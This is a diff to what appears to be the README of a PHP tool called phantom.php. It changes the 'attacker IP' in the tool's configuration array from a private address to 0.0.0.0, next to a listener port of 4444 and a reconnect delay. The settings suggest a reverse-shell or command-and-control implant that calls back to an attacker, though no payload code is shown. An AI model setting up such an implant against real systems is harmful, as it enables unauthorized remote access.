@@ -98,7 +98,7 @@ Edit the `$CFG` array at the top of `phantom.php`:
 
 ```php
 $CFG = array(
-    'host'      => '10.13.5.162',  // Your attacker IP
+    'host'      => '0.0.0.0',      // Your attacker IP
     'port'      => 4444,            // Listener port
     'http_port' => 8888,            // Module server port
     'reconnect' => 5,               // Reconnect delay (seconds)
